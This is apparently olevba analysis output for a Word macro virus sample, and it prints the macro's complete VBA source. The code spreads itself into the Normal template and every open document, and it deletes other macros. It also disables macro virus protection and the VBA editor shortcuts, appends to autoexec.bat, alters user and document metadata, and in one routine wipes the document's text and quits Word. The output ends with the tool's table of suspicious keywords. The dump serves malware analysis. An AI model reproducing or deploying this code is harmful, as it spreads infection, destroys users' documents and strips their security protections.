olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-1bf73d28892088b12fd250433e36fde14503391a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-1bf73d28892088b12fd250433e36fde14503391a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Crazy_Man_02.bas 
in file: Virus.MSWord.Opey-based-1bf73d28892088b12fd250433e36fde14503391a - OLE stream: 'Macros/VBA/Crazy_Man_02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub greetings()
    On Error Resume Next
         If (Month(Now()) > 7) Then
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) > 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) > 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: The Crazy Man"
                        Print #hFile, "pause"
                    Close hFile
                End If
        
         With AutoCorrect.Entries
         .Add Name:="Author", Value:="Author The Crazy Man"
         .Add Name:="President", Value:="President Mr. Josep Estrada"
         .Add Name:="M.Mla.", Value:="Metro Manila Philippines"
         .Add Name:="I am", Value:="I am The Crazy Man"
         .Add Name:="I'm", Value:="I'm The Crazy Man"
         .Add Name:="Who is", Value:="Who is the Crazy Man"
         End With
        End If
End Sub

Sub Crazy_man()
  On Error Resume Next
    Call Crazy_Man_02
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "Crazy_Man_02" Then NTInfected = True
                If (clan <> "Crazy_Man_02") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "Crazy_Man_02" Then ODInfected = True
                    If (clan <> "Crazy_Man_02") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Crazy_Man_02", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy_Man_02", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
    ActiveDocument.Activate
End Sub
Sub Crazy_Man_02()
    On Error Resume Next
     If (Month(Now()) > 7) Then
      Application.UserName = "Crazy Man"
      Application.UserAddress = "LBTMM B'99 PHILIPPINES"
      Application.UserInitials = "Crazy"
      With Dialogs(wdDialogFileSummaryInfo)
        .Author.Value = ""
        .Title.Value = ""
        .Manager.Value = ""
        .Company.Value = ""
        .Comments.Value = ""
        .Execute
    End With
        
    With Dialogs(wdDialogFileSummaryInfo)
        .Author.Value = "Crazy Man"
        .Title.Value = "Crazy"
        .Manager.Value = "MMA"
        .Company.Value = "Crazy Man Company"
        .Comments.Value = "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you tink..."
        .Execute
    End With
    End If
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call Crazy_man
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Crazy_man
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Crazy_man
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call Crazy_man
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Crazy_man
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Crazy_man
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Crazy_man
    With Dialogs(wdDialogFileSaveAs)
        .Show
        .FileName = "Crazy Man.*"
     End With
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Crazy_man
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Crazy_man
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Crazy_man
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Selection.WholeStory
    On Error Resume Next
    Selection.Delete Unit:=wdCharacter, Count:=1
    On Error Resume Next
    Selection.Font.Name = "Times New Roman"
    On Error Resume Next
    Selection.Font.Size = 14
    On Error Resume Next
    Selection.TypeText Text:="Aha!!! You Wan't to know my code..."
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.TypeText Text:="Kill me first"
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.Font.Size = 26
    On Error Resume Next
    Selection.Font.Bold = wdToggle
    On Error Resume Next
    If Selection.Font.Underline = wdUnderlineNone Then
        Selection.Font.Underline = wdUnderlineSingle
    Else
        Selection.Font.Underline = wdUnderlineNone
    End If
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.TypeText Text:="FUCK YOU !!!!"
    
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    On Error Resume Next
    Application.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

